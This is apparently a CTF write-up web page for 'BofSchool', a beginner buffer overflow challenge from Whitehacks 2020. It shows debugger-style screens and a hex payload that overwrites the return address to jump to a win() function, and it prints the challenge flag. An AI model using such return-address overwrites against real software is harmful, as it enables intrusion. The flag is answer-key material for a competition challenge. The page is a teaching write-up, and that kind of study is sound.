<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>CTF Writeup</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>

    <link rel="stylesheet" href="/style.css"/>

  </head>

  <body>
    <!--Navigation Bar-->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <a class="navbar-brand" href="/index.html">Hackin7</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarText">
        <ul class="navbar-nav mr-auto">

          <li class="nav-item">
            <a class="nav-link" href="/about.html">About</a></li>
           <li><a class="nav-link" href="/achievements.html">Achievements</a></li>
           <li><a class="nav-link" href="/blog.html">Blog</a></li>
            <li><a class="nav-link" href="/links.html">CTF Writeups</a></li>
            <li><a class="nav-link" href="/all_projects.html">All Projects</a></li>
        </ul>
      </div>
    </nav>

    <div>
    
    <div class='content'>
    <link href='/css/github-css.css' rel='stylesheet' type='text/css'>
        <br>
        <a href='https://github.com/Hackin7/Programming-Crappy-Solutions/blob/master/Cyber Security/Capture the Flag Competitions/2020/Whitehacks 2020/Binary Exploitation/BofSchool'>Original Github Link</a><br>
        <h1>BofSchool</h1>
<p>93, BINARY EXPLOITATION, 22 SOLVES</p>
<h2>Description</h2>
<p>Welcome to Pwn101.</p>
<p>stty -icanon -echo ; nc chals.whitehacks.ctf.sg 12001; stty sane</p>
<p>Controls:</p>
<p>q           - Quit the program
[Backspace] - Delete character
[Enter]     - Send payload</p>
<p>Use <code>\xXX</code> to send hex encoded characters (useful for unprintable characters), e.g. &quot;\x44\x41\x42&quot; is equivalent to &quot;DAB&quot;
Author: lord_idiot</p>
<h1>Solution</h1>
<p>On running the command given above, you get a UI similar to that shown below.</p>
<pre><code>┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐                                                
│                                                    ││                                                              │                                                
│ 0x00007fffffffd770|+0x00: 41 41 41 41 41 41 41 41  ││ win:                                                         │                                                
│ 0x00007fffffffd778|+0x08: 42 42 42 42 42 42 42 42  ││  0x0000000000400566 &lt;+0&gt; :    push   rbp                     │                                                
│ 0x00007fffffffd780|+0x10: 43 43 43 43 43 43 43 43  ││  0x0000000000400567 &lt;+1&gt; :    mov    rbp,rsp                 │                                                
│ 0x00007fffffffd788|+0x18: 44 44 44 44 44 44 44 44  ││  0x000000000040056a &lt;+4&gt; :    mov    edi,0x601060 &lt;flag&gt;     │                                                
│ 0x00007fffffffd790|+0x20: 45 45 45 45 45 45 45 45  ││  0x000000000040056f &lt;+9&gt; :    call   0x400430 &lt;puts@plt&gt;     │                                                
│ 0x00007fffffffd798|+0x28: 46 46 46 46 46 46 46 46  ││  0x0000000000400574 &lt;+14&gt;:    nop                            │                                                
│ 0x00007fffffffd7a0|+0x30: 47 47 47 47 47 47 47 47  ││  0x0000000000400575 &lt;+15&gt;:    pop    rbp                     │                                                
│ 0x00007fffffffd7a8|+0x38: 48 48 48 48 48 48 48 48  ││  0x0000000000400576 &lt;+16&gt;:    ret                            │                                                
│ 0x00007fffffffd7b0|+0x40: 00 00 00 01 f7 ff cc a0  ││                                                              │                                                
│ 0x00007fffffffd7b8|+0x48: 00 00 00 00 00 40 05 77  ││ main:                                                        │                                                
│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 &lt;+0&gt; :    push   rbp                     │                                                
│                                                    ││  0x0000000000400578 &lt;+1&gt; :    mov    rbp,rsp                 │                                                
└────────────────────────────────────────────────────┘│  0x000000000040057b &lt;+4&gt; :    sub    rsp,0x20                │                                                
┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f &lt;+8&gt; :    lea    rax,[rbp-0x20]          │                                                
│                                                    ││  0x0000000000400583 &lt;+12&gt;:    mov    rdi,rax                 │                                                
│ rip:  0x000000000040058b                           ││  0x0000000000400586 &lt;+15&gt;:    mov    eax,0x0                 │                                                
│ rsp:  0x00007fffffffd770                           ││  0x000000000040058b &lt;+20&gt;:    call   0x400450 &lt;gets@plt&gt;     │                                                
│ rbp:  0x00007fffffffd790                           ││  0x0000000000400590 &lt;+25&gt;:    mov    eax,0x0                 │                                                
│ rdi:  0x00007fffffffd770                           ││  0x0000000000400595 &lt;+30&gt;:    leave                          │                                                
│ rax:  0x00007fffffffd770                           ││  0x0000000000400596 &lt;+31&gt;:    ret                            │                                                
│                                                    ││                                                              │                                                
└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘                                                
┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐                                                
│ AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH                                                   │                                                
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘                                        
                                                                                                          
</code></pre>
<pre><code>┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐                                                
│                                                    ││                                                              │                                                
│ 0x00007fffffffd770|+0x00: 41 41 41 41 41 41 41 41  ││ win:                                                         │                                                
│ 0x00007fffffffd778|+0x08: 42 42 42 42 42 42 42 42  ││  0x0000000000400566 &lt;+0&gt; :    push   rbp                     │                                                
│ 0x00007fffffffd780|+0x10: 43 43 43 43 43 43 43 43  ││  0x0000000000400567 &lt;+1&gt; :    mov    rbp,rsp                 │                                                
│ 0x00007fffffffd788|+0x18: 44 44 44 44 44 44 44 44  ││  0x000000000040056a &lt;+4&gt; :    mov    edi,0x601060 &lt;flag&gt;     │                                                
│ 0x00007fffffffd790|+0x20: 45 45 45 45 45 45 45 45  ││  0x000000000040056f &lt;+9&gt; :    call   0x400430 &lt;puts@plt&gt;     │                                                
│ 0x00007fffffffd798|+0x28:┌ Result ────────────────────────────────────────┐+14&gt;:    nop                            │                                                
│ 0x00007fffffffd7a0|+0x30:│                                                │+15&gt;:    pop    rbp                     │                                                
│ 0x00007fffffffd7a8|+0x38:│ Segmentation fault (core dumped)               │+16&gt;:    ret                            │                                                
│ 0x00007fffffffd7b0|+0x40:│ rip:  0x4646464646464646                       │                                        │                                                
│ 0x00007fffffffd7b8|+0x48:└────────────────────────────────────────────────┘                                        │                                                
│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 &lt;+0&gt; :    push   rbp                     │                                                
│                                                    ││  0x0000000000400578 &lt;+1&gt; :    mov    rbp,rsp                 │                                                
└────────────────────────────────────────────────────┘│  0x000000000040057b &lt;+4&gt; :    sub    rsp,0x20                │                                                
┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f &lt;+8&gt; :    lea    rax,[rbp-0x20]          │                                                
│                                                    ││  0x0000000000400583 &lt;+12&gt;:    mov    rdi,rax                 │                                                
│ rip:  0x4646464646464646                           ││  0x0000000000400586 &lt;+15&gt;:    mov    eax,0x0                 │                                                
│ rsp:  0x00007fffffffd798                           ││  0x000000000040058b &lt;+20&gt;:    call   0x400450 &lt;gets@plt&gt;     │                                                
│ rbp:  0x4545454545454545                           ││  0x0000000000400590 &lt;+25&gt;:    mov    eax,0x0                 │                                                
│ rdi:  0x00007fffffffd770                           ││  0x0000000000400595 &lt;+30&gt;:    leave                          │                                                
│ rax:  0x0000000000000000                           ││  0x0000000000400596 &lt;+31&gt;:    ret                            │                                                
│                                                    ││                                                              │                                                
└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘                                                
┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐                                                
│ AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH                                                   │                                                
└────────────────────────────────────────────────────────────────────────────
</code></pre>
<p>This ends up being a simple Buffer overflow challenge, made even easier by the UI. Just write a sufficient amount of bytes to reach the RIP, and overwrite the RIP to the memory address <code>0x0000000000400566</code></p>
<p>Payload: <code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x66\x05\x40\x00\x00\x00\x00\x00</code></p>
<pre><code>┌ Stack ─────────────────────────────────────────────┐┌ Disassembly ─────────────────────────────────────────────────┐                                                
│                                                    ││                                                              │                                                
│ 0x00007fffffffd770|+0x00: 41 41 41 41 41 41 41 41  ││ win:                                                         │                                                
│ 0x00007fffffffd778|+0x08: 42 42 42 42 42 42 42 42  ││  0x0000000000400566 &lt;+0&gt; :    push   rbp                     │                                                
│ 0x00007fffffffd780|+0x10: 43 43 43 43 43 43 43 43  ││  0x0000000000400567 &lt;+1&gt; :    mov    rbp,rsp                 │                                                
│ 0x00007fffffffd788|+0x18: 44 44 44 44 44 44 44 44  ││  0x000000000040056a &lt;+4&gt; :    mov    edi,0x601060 &lt;flag&gt;     │                                                
│ 0x00007fffffffd790|+0x20: 45 45 45 45 45 45 45 45  ││  0x000000000040056f &lt;+9&gt; :    call   0x400430 &lt;puts@plt&gt;     │                                                
│ 0x00007fffffffd798|+0x28:┌ Result ────────────────────────────────────────┐+14&gt;:    nop                            │                                                
│ 0x00007fffffffd7a0|+0x30:│                                                │+15&gt;:    pop    rbp                     │                                                
│ 0x00007fffffffd7a8|+0x38:│ Congrats! You got the flag :D                  │+16&gt;:    ret                            │                                                
│ 0x00007fffffffd7b0|+0x40:│   WH2020{A_for_pwning!}                        │                                        │                                                
│ 0x00007fffffffd7b8|+0x48:└────────────────────────────────────────────────┘                                        │                                                
│ 0x00007fffffffd7c0|+0x50: 00 00 00 00 00 00 00 00  ││  0x0000000000400577 &lt;+0&gt; :    push   rbp                     │                                                
│                                                    ││  0x0000000000400578 &lt;+1&gt; :    mov    rbp,rsp                 │                                                
└────────────────────────────────────────────────────┘│  0x000000000040057b &lt;+4&gt; :    sub    rsp,0x20                │                                                
┌ Registers ─────────────────────────────────────────┐│  0x000000000040057f &lt;+8&gt; :    lea    rax,[rbp-0x20]          │                                                
│                                                    ││  0x0000000000400583 &lt;+12&gt;:    mov    rdi,rax                 │                                                
│ rip:  0x0000000000400566                           ││  0x0000000000400586 &lt;+15&gt;:    mov    eax,0x0                 │                                                
│ rsp:  0x00007fffffffd798                           ││  0x000000000040058b &lt;+20&gt;:    call   0x400450 &lt;gets@plt&gt;     │                                                
│ rbp:  0x00007fffffffd798                           ││  0x0000000000400590 &lt;+25&gt;:    mov    eax,0x0                 │                                                
│ rdi:  0x0000000000601060                           ││  0x0000000000400595 &lt;+30&gt;:    leave                          │                                                
│ rax:  0x0000000000000000                           ││  0x0000000000400596 &lt;+31&gt;:    ret                            │                                                
│                                                    ││                                                              │                                                
└────────────────────────────────────────────────────┘└──────────────────────────────────────────────────────────────┘                                                
┌ Input ─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐                                                
│ AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x66\x05\x40\x00\x00\x00\x00\x00                                           │                                                
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘                                                                           
</code></pre>
<p>Overall a nice challenge for beginners.</p>
<h1>Flag</h1>
<p><code>WH2020{A_for_pwning!}</code></p>

    </div>
    
    </div>

  </body>
</html>